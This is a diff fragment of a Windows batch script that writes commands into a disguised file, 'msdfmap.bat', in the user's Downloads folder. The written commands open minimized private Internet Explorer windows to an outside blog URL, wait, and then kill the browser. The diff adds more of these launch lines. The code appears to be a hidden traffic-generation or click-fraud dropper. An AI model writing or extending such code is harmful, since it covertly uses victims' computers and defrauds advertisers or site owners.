@@ -279,7 +279,11 @@ ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redire
 ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
-
+ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO ping -n 60 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat 
 ECHO taskkill /f /im iexplore.exe >> C:\Users\%username%\Downloads\msdfmap.bat
 
